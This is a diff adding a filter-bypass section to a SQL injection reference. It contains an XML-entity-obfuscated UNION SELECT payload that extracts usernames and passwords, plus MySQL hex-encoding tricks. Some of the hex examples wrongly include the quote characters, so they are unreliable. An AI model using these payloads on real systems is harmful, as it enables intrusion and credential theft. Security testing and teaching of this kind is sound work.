@@ -14,6 +14,7 @@ A structured reference for SQL injection techniques, payloads, and enumeration s
 - [Methodology](#methodology)
 - [MySQL Operator Precedence](#mysql-operator-precedence)
 - [Comment Syntax](#comment-syntax)
+- [Filter bypass](#filter-bypass)
 - [Authentication Bypass](#authentication-bypass)
 - [Union-Based Injection](#union-based-injection)
   - [Column Enumeration](#column-enumeration)
@@ -105,6 +106,70 @@ Comments truncate the remainder of the original query after your injection.
 
 > **Note:** MySQL requires a space after `--`. The `-- -` form (dash dash space dash) is common in payloads to ensure the space survives URL encoding. The `#` shorthand works only in MySQL.
 
+---
+
+## Filter bypass
+
+### XML encoding
+
+Consider a vulnerable application that allows users to look up product's stock unit. This triggers a **POST** request as follow:
+```
+POST /product/stock HTTP/1.1
+Host: vuln.app
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+    <productId>
+      1
+    </productId>
+    <storeId>
+      1
+    </storeId>
+  </stockCheck>
+```
+
+- Obfuscate your payload using **XML entities** with `Burp's Hackvertor extension`.
+- Highlight input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
+
+```
+POST /product/stock HTTP/1.1
+Host: vuln.app
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+    <productId>
+      1
+    </productId>
+    <storeId>
+      <@hex_entities>
+        1 UNION SELECT username || '~' || password FROM users
+      </@hex_entities>
+    </storeId>
+  </stockCheck>
+```
+
+---
+
+### Hex encoding
+
+When the vulnerable web app block request that include: `' '`, `" "`, try `ASCII hex` encoding as follow:
+
+```
+'admin' --> blocked
+
+# Try:
+Convert string to MySQL hex literal 'admin' -> 0x61646d696e
+
+0x + Burp Decoder's ASCII hex encode
+
+# More example:
+
+'user' -> 0x277573657227
+'a' -> 0x276127
+'b' -> 0x276227
+```
 ---
 
 ## Authentication Bypass
